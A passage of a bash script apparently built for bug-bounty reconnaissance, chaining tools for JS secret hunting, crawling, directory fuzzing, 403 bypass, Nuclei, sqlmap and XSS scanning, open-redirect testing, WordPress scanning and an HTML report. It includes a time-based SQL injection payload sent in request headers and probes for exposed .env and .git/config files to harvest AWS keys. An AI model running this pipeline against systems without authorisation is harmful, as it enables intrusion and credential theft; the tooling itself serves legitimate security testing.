    # filesystems like /mnt/c/... under WSL).
    run_task "JS tagging/combine" "$D3/js_combined.txt" bash -c '
        {
            while IFS=$'"'"'\t'"'"' read -r url f; do
                [ -s "'"$D3"'/js_bodies/$f.js" ] || continue
                echo "### SOURCE: $url"
                cat "'"$D3"'/js_bodies/$f.js"
            done < "'"$D3"'/js_manifest.txt"
        } > "'"$D3"'/js_combined.txt"
    '
    log "JS content fetched: $(find "$D3/js_bodies" -type f 2>/dev/null | wc -l) of $JS_COUNT files"

    if [ -f "$MODULES_DIR/js_secret_hunter.py" ] && [ -s "$D3/js_combined.txt" ]; then
        step "JS SECRET SCAN RESULTS (grouped by URL)"
        python3 "$MODULES_DIR/js_secret_hunter.py" "$D3/js_combined.txt" "$D3/js_secrets_detail.json" | tee "$D3/js_secrets_summary.txt"
    fi

    if check_bin secretfinder; then
        > "$D3/secretfinder_results.txt"
        cat "$D2/js_urls.txt" | xargs -P "$PARALLEL" -I{} bash -c \
            'echo "===== {} =====" >> "'"$D3"'/secretfinder_results.txt"; secretfinder -i "{}" -o cli >> "'"$D3"'/secretfinder_results.txt" 2>/dev/null'
        hits=$(grep -ciE 'key|secret|token|password' "$D3/secretfinder_results.txt" 2>/dev/null || echo 0)
        [ "$hits" -gt 0 ] && log "SecretFinder: $hits possible hit line(s) (full detail: $D3/secretfinder_results.txt)" \
                          || log "SecretFinder: nothing found."
    fi
    mark_done "P4"
fi

# ============================================================
# PHASE 5: Katana crawl
# ============================================================
step "PHASE 5: Katana Deep Crawl"
if phase_done "P5"; then
    log "Resuming: Phase 5: Katana Deep Crawl previously completed, skipping."
elif ! phase_selected "P5"; then
    info "Phase 5: Katana Deep Crawl skipped (not selected in custom scan)."
elif ask "Run Katana for deep crawling?"; then
    check_bin katana && run_task "katana crawl" "$D6/katana_urls.txt" bash -c \
        "katana -list '$D1/live_urls_only.txt' -d 5 -kf all -jc -fx -silent -c $PARALLEL -o '$D6/katana_urls.txt' >/dev/null 2>&1"
    grep -Ei "api|v1|v2|auth|token|oauth|sql|password|admin|debug|config" "$D6/katana_urls.txt" 2>/dev/null > "$D6/katana_interesting.txt"
    log "Katana URLs: $(wc -l < "$D6/katana_urls.txt" 2>/dev/null || echo 0) | Interesting: $(wc -l < "$D6/katana_interesting.txt" 2>/dev/null || echo 0)"
    [ -s "$D6/katana_urls.txt" ] && cat "$D6/katana_urls.txt" >> "$D2/all_urls_clean.txt" 2>/dev/null && sort -u -o "$D2/all_urls_clean.txt" "$D2/all_urls_clean.txt"
    mark_done "P5"
fi

# ============================================================
# PHASE 6: Parameter Discovery
# ============================================================
step "PHASE 6: Parameter Discovery"
if phase_done "P6"; then
    log "Resuming: Phase 6: Parameter Discovery previously completed, skipping."
elif ! phase_selected "P6"; then
    info "Phase 6: Parameter Discovery skipped (not selected in custom scan)."
elif ask "Run ParamSpider + SSRF/redirect param hunting?"; then
    check_bin paramspider && run_task "paramspider" "$D7/paramspider_raw.txt" bash -c \
        "paramspider -d '$DOMAIN' -s 2>/dev/null | grep -Ei 'https?://' | sort -u > '$D7/paramspider_raw.txt'"

    [ -s "$D7/paramspider_raw.txt" ] && cat "$D7/paramspider_raw.txt" >> "$D2/all_urls_clean.txt" 2>/dev/null && sort -u -o "$D2/all_urls_clean.txt" "$D2/all_urls_clean.txt"

    if [ -s "$D2/all_urls_clean.txt" ]; then
        run_task "live param check" "$D7/live_param_urls.txt" bash -c \
        "grep -E '\?.+=' '$D2/all_urls_clean.txt' | sort -u | '$HTTPX' -silent -mc 200 -threads $THREADS -H 'User-Agent: $UA' -o '$D7/live_param_urls_raw.txt' >/dev/null 2>&1; awk '{print \$1}' '$D7/live_param_urls_raw.txt' > '$D7/live_param_urls.txt' 2>/dev/null"
    fi

    if [ -f "$MODULES_DIR/ssrf_param_hunter.py" ] && [ -s "$D2/all_urls_clean.txt" ]; then
        step "SSRF / REDIRECT PARAMETER SCAN RESULTS"
        python3 "$MODULES_DIR/ssrf_param_hunter.py" "$D2/all_urls_clean.txt" "$D7/ssrf_params_detail.json" | tee "$D7/ssrf_params_summary.txt"
    fi
    mark_done "P6"
fi

# ============================================================
# PHASE 7: Directory Fuzzing (dirsearch -> ffuf -> feroxbuster)
# ============================================================
step "PHASE 7: Directory Fuzzing (dirsearch -> ffuf -> feroxbuster, multi-host)"
if phase_done "P7"; then
    log "Resuming: Phase 7: Directory Fuzzing previously completed, skipping."
elif ! phase_selected "P7"; then
    info "Phase 7: Directory Fuzzing skipped (not selected in custom scan)."
elif ask "Fuzz every live subdomain? (parallel)"; then
    mkdir -p "$D4/per_host"
    NUM_HOSTS=$(wc -l < "$D1/live_urls_only.txt" 2>/dev/null || echo 0)
    log "Fuzzing $NUM_HOSTS host(s) with up to $PARALLEL running in parallel..."

    if check_bin dirsearch; then
        cat "$D1/live_urls_only.txt" | xargs -P "$PARALLEL" -I{} bash -c '
            host=$(echo "{}" | sed -E "s#https?://##; s#[:/]#_#g")
            dirsearch -u "{}" -t '"$THREADS"' --full-url -o "'"$D4"'/per_host/${host}_dirsearch.txt" >/dev/null 2>&1
        '
        log "dirsearch: done for $NUM_HOSTS host(s)."
    fi

    # ffuf with -ac (auto-calibration) so wildcard/soft-200 responses get
    # auto-filtered instead of every path looking like a hit.
    if [ -n "$WORDLIST" ] && check_bin ffuf; then
        cat "$D1/live_urls_only.txt" | xargs -P "$PARALLEL" -I{} bash -c '
            host=$(echo "{}" | sed -E "s#https?://##; s#[:/]#_#g")
            ffuf -c -w "'"$WORDLIST"'" -u "{}/FUZZ" -H "User-Agent: '"$UA"'" \
                -mc 200,301,302,401,403 -ac -rate '"$RATE"' -of json -o "'"$D4"'/per_host/${host}_ffuf.json" -s >/dev/null 2>&1
        '
        log "ffuf: done for $NUM_HOSTS host(s)."
        if check_bin jq; then
            for jf in "$D4"/per_host/*_ffuf.json; do
                [ -s "$jf" ] || continue
                jq -r '.results[]? | "\(.status)\t\(.length)\t\(.url)"' "$jf" 2>/dev/null
            done | sort -n > "$D4/ffuf_all_hits_raw.txt"
            awk -F'\t' '{printf "  %-5s %-10s %s\n", $1, $2, $3}' "$D4/ffuf_all_hits_raw.txt" > "$D4/ffuf_all_hits.txt"
            step "FFUF RESULTS (status | size | url)"
            show_capped "$D4/ffuf_all_hits.txt" 20
            [ -s "$D4/ffuf_all_hits.txt" ] || warn "ffuf: no hits (or everything was wildcard-filtered)."
        fi
    fi

    if check_bin feroxbuster; then
        cat "$D1/live_urls_only.txt" | xargs -P "$PARALLEL" -I{} bash -c '
            host=$(echo "{}" | sed -E "s#https?://##; s#[:/]#_#g")
            args=(-u "{}" -o "'"$D4"'/per_host/${host}_ferox.txt" -t '"$THREADS"' -H "User-Agent: '"$UA"'" -q --auto-tune)
            [ -n "'"$WORDLIST"'" ] && args+=(-w "'"$WORDLIST"'")
            feroxbuster "${args[@]}" >/dev/null 2>&1
        '
        log "feroxbuster: done for $NUM_HOSTS host(s)."
    fi

    # pull admin/control-panel-looking hits out of the fuzz results into the
    # dedicated admin panels folder too
    grep -hEi '(admin|cpanel|phpmyadmin|adminer|grafana|kibana|jenkins|portainer|webmin|pgadmin|manager|console|dashboard|portal)' \
        "$D4"/per_host/*_dirsearch.txt "$D4"/per_host/*_ferox.txt "$D4/ffuf_all_hits.txt" 2>/dev/null \
        | sort -u > "$D12/fuzz_admin_hits.txt"
    [ -s "$D12/fuzz_admin_hits.txt" ] && log "Admin-looking paths found by fuzzing: $(wc -l < "$D12/fuzz_admin_hits.txt") (see $D12/fuzz_admin_hits.txt)"

    grep -h "403" "$D4"/per_host/*_dirsearch.txt "$D4"/per_host/*_ferox.txt 2>/dev/null | \
        grep -oE 'https?://[^ ]+' | sort -u > "$D4/403_urls.txt"
    if check_bin jq; then
        for jf in "$D4"/per_host/*_ffuf.json; do
            [ -f "$jf" ] && jq -r '.results[]? | select(.status==403) | .url' "$jf" 2>/dev/null >> "$D4/403_urls.txt"
        done
    fi
    sort -u -o "$D4/403_urls.txt" "$D4/403_urls.txt" 2>/dev/null
    log "403 hits collected across all hosts: $(wc -l < "$D4/403_urls.txt" 2>/dev/null || echo 0)"
    mark_done "P7"
fi

# ============================================================
# PHASE 8: 403 Bypass (multi-process)
# ============================================================
step "PHASE 8: 403 Bypass (gobypass403, multi-process)"
if phase_done "P8"; then
    log "Resuming: Phase 8: 403 Bypass previously completed, skipping."
elif ! phase_selected "P8"; then
    info "Phase 8: 403 Bypass skipped (not selected in custom scan)."
elif [ -s "$D4/403_urls.txt" ] && ask "Run gobypass403 on 403 URLs (parallel chunks)?"; then
    if check_bin gobypass403; then
        mkdir -p "$D4/gobypass403_output"
        split -n l/"$PARALLEL" "$D4/403_urls.txt" "$D4/403_chunk_" 2>/dev/null
        log "Split into $(ls "$D4"/403_chunk_* 2>/dev/null | wc -l) chunks, running in parallel..."
        ls "$D4"/403_chunk_* 2>/dev/null | xargs -P "$PARALLEL" -I{} bash -c '
            n=$(basename "{}")
            gobypass403 -l "{}" -o "'"$D4"'/gobypass403_output" -mc "200,301,302" -cr 15 > "'"$D4"'/gobypass403_output/${n}.log" 2>/dev/null
        '
        rm -f "$D4"/403_chunk_*
        log "gobypass403 output: $D4/gobypass403_output/"
    fi
    mark_done "P8"
fi

# ============================================================
# PHASE 9: Nuclei + Pattern hunting (gf) + Injections
# ============================================================
step "PHASE 9: Nuclei Vulnerability Scan"
if phase_done "P9"; then
    log "Resuming: Phase 9: Nuclei Vulnerability Scan previously completed, skipping."
elif ! phase_selected "P9"; then
    info "Phase 9: Nuclei Vulnerability Scan skipped (not selected in custom scan)."
elif ask "Run Nuclei (general + CISA known-exploited)?"; then
    check_bin nuclei && {
        run_task "nuclei general" "$D5/nuclei_results.txt" bash -c \
            "cat '$D1/live_urls_only.txt' | nuclei -rl $RATE -c $PARALLEL -silent -o '$D5/nuclei_results.txt' >/dev/null 2>&1"
        run_task "nuclei CISA-tagged" "$D5/cisa_results.txt" bash -c \
            "cat '$D1/live_urls_only.txt' | nuclei -rl $RATE -c $PARALLEL -timeout 10 -tags cisa -silent -o '$D5/cisa_results.txt' >/dev/null 2>&1"
    }
    mark_done "P9"
fi

step "PHASE 9a: All Parameterized URLs -> SQLi + XSS (broader than gf patterns)"
if phase_done "P9a"; then
    log "Resuming: Phase 9a: Parameterized URL SQLi+XSS previously completed, skipping."
elif ! phase_selected "P9a"; then
    info "Phase 9a: Parameterized URL SQLi+XSS skipped (not selected in custom scan)."
elif [ -s "$D2/all_urls_clean.txt" ] && ask "Extract every URL with a query parameter and test SQLi/XSS on all of them?"; then
    grep -E '\?[^ ]*=' "$D2/all_urls_clean.txt" "$D7/live_param_urls.txt" "$D7/paramspider_raw.txt" 2>/dev/null | sort -u > "$D8/all_param_urls_raw.txt"
    dedupe_params "$D8/all_param_urls_raw.txt" "$D8/all_param_urls_deduped.txt"
    log "Parameterized URLs: $(wc -l < "$D8/all_param_urls_raw.txt" 2>/dev/null || echo 0) raw -> $(wc -l < "$D8/all_param_urls_deduped.txt" 2>/dev/null || echo 0) unique injection points after dedup"

    if [ -s "$D8/all_param_urls_deduped.txt" ] && check_bin sqlmap; then
        run_task "sqlmap (all params)" "$D8/sqlmap_all_output" bash -c \
            "sqlmap -m '$D8/all_param_urls_deduped.txt' --batch --risk 2 --level 1 --random-agent --output-dir='$D8/sqlmap_all_output' >/dev/null 2>&1"
        vuln=$(grep -rli 'is vulnerable' "$D8/sqlmap_all_output" 2>/dev/null | wc -l)
        [ "$vuln" -gt 0 ] && warn "sqlmap: $vuln target(s) flagged vulnerable, check $D8/sqlmap_all_output/" \
                          || log "sqlmap: no confirmed SQLi."
    fi

    if [ -s "$D8/all_param_urls_deduped.txt" ]; then
        if check_bin dalfox; then
            run_task "dalfox (all params)" "$D8/dalfox_results.txt" bash -c \
                "dalfox file '$D8/all_param_urls_deduped.txt' --silence --worker $PARALLEL -o '$D8/dalfox_results.txt' >/dev/null 2>&1"
        elif check_bin xsser; then
            log "xsser running on all deduped param URLs ($PARALLEL parallel)..."
            > "$D8/xsser_all_results.txt"
            cat "$D8/all_param_urls_deduped.txt" | xargs -P "$PARALLEL" -I{} bash -c \
                'xsser -u "{}" >> "'"$D8"'/xsser_all_results.txt" 2>/dev/null'
        else
            warn "Neither dalfox nor xsser found, skipping XSS check."
        fi
    fi
    mark_done "P9a"
fi

step "PHASE 9b: Injection Hunting (SQLi / XSS / Redirect / SSTI via gf)"
if phase_done "P9b"; then
    log "Resuming: Phase 9b: gf Injection Hunting previously completed, skipping."
elif ! phase_selected "P9b"; then
    info "Phase 9b: gf Injection Hunting skipped (not selected in custom scan)."
elif [ -s "$D2/all_urls_clean.txt" ] && ask "Run gf-pattern-based SQLi/XSS/Redirect/SSTI hunting?"; then
    check_bin gf && {
        gf sqli < "$D2/all_urls_clean.txt" > "$D8/gf_sqli.txt" 2>/dev/null
        gf redirect < "$D2/all_urls_clean.txt" > "$D8/gf_redirect.txt" 2>/dev/null
        gf ssti < "$D2/all_urls_clean.txt" > "$D8/gf_ssti.txt" 2>/dev/null
        gf xss < "$D2/all_urls_clean.txt" > "$D8/gf_xss.txt" 2>/dev/null
        log "gf candidates -> sqli:$(wc -l < "$D8/gf_sqli.txt" 2>/dev/null||echo 0) redirect:$(wc -l < "$D8/gf_redirect.txt" 2>/dev/null||echo 0) ssti:$(wc -l < "$D8/gf_ssti.txt" 2>/dev/null||echo 0) xss:$(wc -l < "$D8/gf_xss.txt" 2>/dev/null||echo 0)"

        if [ -s "$D8/gf_redirect.txt" ] && check_bin qsreplace; then
            cat "$D8/gf_redirect.txt" | qsreplace 'https://evil-recon-test.example' | "$HTTPX" -silent -fr -location -o "$D8/open_redirect_raw.txt" >/dev/null 2>&1
            grep -i 'evil-recon-test.example' "$D8/open_redirect_raw.txt" 2>/dev/null > "$D8/open_redirect_confirmed.txt"
            log "Open redirect confirmed: $(wc -l < "$D8/open_redirect_confirmed.txt" 2>/dev/null || echo 0)"
        fi
    }
    mark_done "P9b"
fi

step "PHASE 9c: Host Header / Header-based Injection Check"
if phase_done "P9c"; then
    log "Resuming: Phase 9c: Header Injection Check previously completed, skipping."
elif ! phase_selected "P9c"; then
    info "Phase 9c: Header Injection Check skipped (not selected in custom scan)."
elif ask "Check for host-header and header-based injection (SQLi/XSS/SSRF via headers)?"; then
    OUT="$D8/header_injection_results.txt"; > "$OUT"
    TARGETS=$(head -20 "$D1/live_urls_only.txt" 2>/dev/null)
    log "Testing $(echo "$TARGETS" | grep -c .) host(s) for header-based time/reflection injection..."
    for t in $TARGETS; do
        base_time=$( { /usr/bin/time -f "%e" curl -s -o /dev/null "$t" 2>&1 1>/dev/null; } 2>/dev/null | tail -1)
        inj_time=$( { /usr/bin/time -f "%e" curl -s -o /dev/null \
            -H "X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z" \
            -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z" \
            --max-time 15 "$t" 2>&1 1>/dev/null; } 2>/dev/null | tail -1)
        awk -v t="$t" -v b="$base_time" -v i="$inj_time" 'BEGIN{
            if (i+0 > b+4) print "[POSSIBLE TIME-BASED INJECTION] "t" baseline="b"s injected="i"s";
        }' >> "$OUT"
        refl=$(curl -s -H "Host: xxrecontestxx.$DOMAIN" --max-time 10 "$t" 2>/dev/null | grep -c "xxrecontestxx")
        [ "${refl:-0}" -gt 0 ] && echo "[HOST HEADER REFLECTED] $t" >> "$OUT"
    done
    if [ -s "$OUT" ]; then
        warn "Header injection: $(wc -l < "$OUT") potential finding(s):"
        cat "$OUT"
    else
        log "Header injection: no positive signal."
    fi
    mark_done "P9c"
fi

# ============================================================
# PHASE 10: AWS/IAM Key exposure
# ============================================================
step "PHASE 10: Exposed AWS/IAM Keys"
if phase_done "P10"; then
    log "Resuming: Phase 10: AWS/IAM Key Exposure previously completed, skipping."
elif ! phase_selected "P10"; then
    info "Phase 10: AWS/IAM Key Exposure skipped (not selected in custom scan)."
elif ask "Check for exposed AWS/IAM access keys?"; then
    OUT="$D8/aws_keys.txt"
    (echo "$DOMAIN" | subfinder -silent -all 2>/dev/null; cat "$D1/live_urls_only.txt" 2>/dev/null) | sort -u | \
        "$HTTPX" -silent -path ".env,.mysql_history,.git/config,config.json" \
        -mc 200 -ports 80,443,8080,8443 -H "User-Agent: $UA" 2>/dev/null | \
        grep -iE 'A[SK]IA[0-9A-Z]{16}' > "$OUT"
    [ -s "$OUT" ] && { warn "AWS/IAM keys found: $OUT"; cat "$OUT"; } || log "Nothing found."
    mark_done "P10"
fi

# ============================================================
# PHASE 11: SSL/TLS + HTTP Methods
# ============================================================
step "PHASE 11: SSL/TLS + HTTP Methods Check"
if phase_done "P11"; then
    log "Resuming: Phase 11: SSL/TLS + HTTP Methods previously completed, skipping."
elif ! phase_selected "P11"; then
    info "Phase 11: SSL/TLS + HTTP Methods skipped (not selected in custom scan)."
elif ask "Run testssl.sh + HTTP methods (PUT/DELETE/TRACE) check?"; then
    if check_bin testssl.sh; then
        run_task "testssl.sh" "$D9/testssl_$DOMAIN.log" bash -c \
            "testssl.sh --quiet --color 0 'https://$DOMAIN' > '$D9/testssl_$DOMAIN.log' 2>/dev/null"
        weak=$(grep -iE 'VULNERABLE|NOT ok|weak' "$D9/testssl_$DOMAIN.log" 2>/dev/null | wc -l)
        [ "$weak" -gt 0 ] && warn "testssl: $weak potential weak-config line(s), see $D9/testssl_$DOMAIN.log" \
                          || log "testssl: no obvious weak findings."
    fi

    OUT="$D9/http_methods.txt"; > "$OUT"
    cat "$D1/live_urls_only.txt" 2>/dev/null | xargs -P "$PARALLEL" -I{} bash -c '
        allow=$(curl -s -k -X OPTIONS -I --max-time 8 "{}" 2>/dev/null | grep -i "^allow:")
        if echo "$allow" | grep -qiE "PUT|DELETE|TRACE|CONNECT"; then
            echo "[RISKY METHODS] {} -> $allow" >> "'"$OUT"'"
        fi
    '
    if [ -s "$OUT" ]; then warn "Risky HTTP methods found:"; cat "$OUT"
    else log "HTTP methods: no risky method (PUT/DELETE/TRACE) enabled."
    fi
    mark_done "P11"
fi

# ============================================================
# PHASE 12: WebDAV misconfiguration detection (detection ONLY)
# ============================================================
step "PHASE 12: WebDAV Misconfiguration Detection"
if phase_done "P12"; then
    log "Resuming: Phase 12: WebDAV Detection previously completed, skipping."
elif ! phase_selected "P12"; then
    info "Phase 12: WebDAV Detection skipped (not selected in custom scan)."
elif ask "Detect WebDAV misconfig (PUT/MOVE/PROPFIND exposure, read-only check)?"; then
    OUT="$D10/webdav_findings.txt"; > "$OUT"
    cat "$D1/live_urls_only.txt" 2>/dev/null | xargs -P "$PARALLEL" -I{} bash -c '
        opts=$(curl -s -k -X OPTIONS -I --max-time 8 "{}" 2>/dev/null | grep -i "^allow:")
        if echo "$opts" | grep -qiE "PROPFIND|MKCOL|MOVE|COPY"; then
            echo "[WEBDAV ENABLED] {} -> $opts" >> "'"$OUT"'"
        fi
    '
    if check_bin davtest && [ -s "$OUT" ]; then
        grep -oE 'https?://[^ ]+' "$OUT" | while read -r host; do
            echo "----- davtest: $host -----" >> "$D10/davtest_output.txt"
            davtest -url "$host" >> "$D10/davtest_output.txt" 2>/dev/null
        done
    fi
    if [ -s "$OUT" ]; then
        warn "WebDAV exposure found on $(wc -l < "$OUT") host(s):"; cat "$OUT"
        info "Detection only -- no upload/deface payload was sent."
    else
        log "WebDAV: no exposed host found."
    fi
    mark_done "P12"
fi

# ============================================================
# PHASE 13: WordPress Detection + wpscan + wpprobe
# ============================================================
step "PHASE 13: WordPress Detection"
if phase_done "P13"; then
    IS_WP=$(cat "$BASE/.is_wordpress" 2>/dev/null || echo "no")
    log "Resuming: Phase 13 previously completed (WordPress: $IS_WP), skipping."
elif ! phase_selected "P13"; then
    IS_WP=$(cat "$BASE/.is_wordpress" 2>/dev/null || echo "no")
    info "Phase 13 skipped (not selected in custom scan)."
else
    IS_WP="no"
    if grep -qiE 'wp-content|wp-includes|wordpress' "$D1/live_subdomains.txt" "$D6/katana_urls.txt" 2>/dev/null; then
        IS_WP="yes"
    elif curl -s -k --max-time 8 "https://$DOMAIN/wp-login.php" 2>/dev/null | grep -qi wordpress; then
        IS_WP="yes"
    fi
    echo "$IS_WP" > "$BASE/.is_wordpress"

    if [ "$IS_WP" = "yes" ]; then
        log "WordPress detected on $DOMAIN."
        if ask "Run wpscan + wpprobe for WordPress?"; then
            check_bin wpscan && run_task "wpscan" "$D11/wpscan_$DOMAIN.txt" bash -c \
                "wpscan --url 'https://$DOMAIN' --enumerate vp,vt,tt,cb,dbe,u --random-user-agent -f cli-no-color > '$D11/wpscan_$DOMAIN.txt' 2>/dev/null"
            if check_bin wpprobe; then
                run_task "wpprobe" "$D11/wpprobe_$DOMAIN.txt" bash -c \
                    "wpprobe scan -u 'https://$DOMAIN' -o '$D11/wpprobe_$DOMAIN.csv' > '$D11/wpprobe_$DOMAIN.txt' 2>/dev/null"
                crit=$(grep -ic critical "$D11/wpprobe_$DOMAIN.txt" 2>/dev/null || echo 0)
                [ "$crit" -gt 0 ] && warn "wpprobe: $crit critical-severity mention(s) found." || log "wpprobe: no critical hits reported."
            fi
        fi
    else
        log "WordPress not detected, phase skipped."
    fi
    mark_done "P13"
fi

# ============================================================
# PHASE 14: Final Secrets Sweep (catches JS found later in the scan)
# ============================================================
step "PHASE 14: Final Secrets Sweep"
if phase_done "P14"; then
    log "Resuming: Phase 14 (Final Secrets Sweep) previously completed, skipping."
elif ! phase_selected "P14"; then
    info "Phase 14 (Final Secrets Sweep) skipped (not selected in custom scan)."
elif [ -f "$MODULES_DIR/js_secret_hunter.py" ]; then
    NEW_JS="$D3/js_urls_late.txt"
    {
        grep -Eio 'https?://[^ "'"'"']+\.js(\?[^ "'"'"']*)?' "$D6/katana_urls.txt" 2>/dev/null
        grep -Eio '(https?://[^ ]+\.js)' "$D4"/per_host/*_dirsearch.txt "$D4"/per_host/*_ferox.txt 2>/dev/null | sed 's/^[^:]*://'
    } | sort -u > "$NEW_JS.raw" 2>/dev/null
    comm -23 "$NEW_JS.raw" <(sort -u "$D2/js_urls.txt" 2>/dev/null) 2>/dev/null > "$NEW_JS"

    if [ -s "$NEW_JS" ]; then
        log "$(wc -l < "$NEW_JS") new JS file(s) found post-crawl (katana/fuzzing) -- fetching + re-scanning..."
        > "$D3/js_manifest_late.txt"
        run_task "late JS download" "$D3/js_manifest_late.txt" bash -c '
            cat "'"$NEW_JS"'" | xargs -P '"$PARALLEL"' -I{} bash -c "
                url=\"{}\"
                f=\"late_\$(echo \"\$url\" | md5sum | cut -d\" \" -f1)\"
                curl -s -A \"'"$UA"'\" --max-time 10 \"\$url\" -o \"'"$D3"'/js_bodies/\$f.js\" 2>/dev/null
                printf \"%s\t%s\n\" \"\$url\" \"\$f\" >> \"'"$D3"'/js_manifest_late.txt\"
            "
        '
        run_task "late JS combine" "$D3/js_combined_final.txt" bash -c '
            {
                cat "'"$D3"'/js_combined.txt" 2>/dev/null
                while IFS=$'"'"'\t'"'"' read -r url f; do
                    [ -s "'"$D3"'/js_bodies/$f.js" ] || continue
                    echo "### SOURCE: $url"
                    cat "'"$D3"'/js_bodies/$f.js"
                done < "'"$D3"'/js_manifest_late.txt"
            } > "'"$D3"'/js_combined_final.txt"
        '
        step "FINAL JS SECRET SCAN RESULTS (all JS found across entire scan, grouped by URL)"
        python3 "$MODULES_DIR/js_secret_hunter.py" "$D3/js_combined_final.txt" "$D3/js_secrets_final_detail.json" | tee "$D3/js_secrets_final_summary.txt"
    else
        log "No new JS files found in this round -- Phase 4 results are final."
        [ -f "$D3/js_secrets_summary.txt" ] && { step "JS SECRET SCAN RESULTS (recap)"; cat "$D3/js_secrets_summary.txt"; }
    fi
    mark_done "P14"
fi

# ============================================================
# PHASE 15: HTML Report
# ============================================================
step "PHASE 15: Building HTML Report"
if [ -f "$MODULES_DIR/report_builder.py" ]; then
    python3 "$MODULES_DIR/report_builder.py" "$BASE" "$DOMAIN" "$IS_WP" 2>/dev/null
    if [ -s "$BASE/report.html" ]; then
        log "HTML report ready: $(pwd)/$BASE/report.html (open it in a browser -- everything is sorted there)"
    else
        warn "Report builder ran but no report.html was produced -- check python3 output above."
    fi
else
    warn "modules/report_builder.py not found, skipping HTML report."
fi

# ============================================================
# Summary
# ============================================================
step "SCAN COMPLETE"
echo -e "${GREEN}Results folder:${NC} $(pwd)/$BASE"
echo ""
echo -e "${BOLD}Quick summary:${NC}"
printf "  %-32s %s\n" "Subdomains found:"      "$(wc -l < "$D1/all_subdomains.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "Excluded (out of scope):" "$(wc -l < "$D1/excluded_out_of_scope.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "Live hosts:"            "$(wc -l < "$D1/live_urls_only.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "Total URLs:"            "$(wc -l < "$D2/all_urls_clean.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "JS files found:"        "$(wc -l < "$D2/js_urls.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "Admin/control panels:"  "$(( $(wc -l < "$D12/naming_matches.txt" 2>/dev/null || echo 0) + $(wc -l < "$D12/admin_paths_hits.txt" 2>/dev/null || echo 0) ))"
printf "  %-32s %s\n" "403 hits:"              "$(wc -l < "$D4/403_urls.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "Nuclei findings:"       "$(wc -l < "$D5/nuclei_results.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "WebDAV exposed hosts:"  "$(wc -l < "$D10/webdav_findings.txt" 2>/dev/null || echo 0)"
printf "  %-32s %s\n" "WordPress detected:"    "$IS_WP"
echo ""
[ -s "$BASE/report.html" ] && log "Open $BASE/report.html for the full sorted report."
log "All raw output is organized under $BASE/, one folder per phase."
touch "$BASE/.scan_complete"
